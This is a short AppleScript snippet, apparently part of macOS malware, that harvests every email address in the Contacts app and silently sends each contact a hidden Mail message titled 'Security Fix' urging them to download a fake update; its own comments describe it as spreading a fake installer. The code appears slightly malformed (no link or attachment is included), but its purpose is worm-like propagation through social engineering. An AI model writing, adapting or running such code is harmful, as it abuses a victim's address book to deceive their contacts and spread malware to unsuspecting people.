-- Spread via Contacts using Messages or Mail

tell application "Contacts"
	set thePeople to every person
	repeat with p in thePeople
		set theEmails to value of every email of p
		repeat with e in theEmails
			-- Send fake installer to each contact
			do shell script "osascript -e 'tell application \"Mail\" to send (make new outgoing message with properties {subject:\"Security Fix\", content:\"Download this update:\", visible:false, to recipient:{address:\"" & e & "\"}})'"
		end repeat
	end repeat
end tell
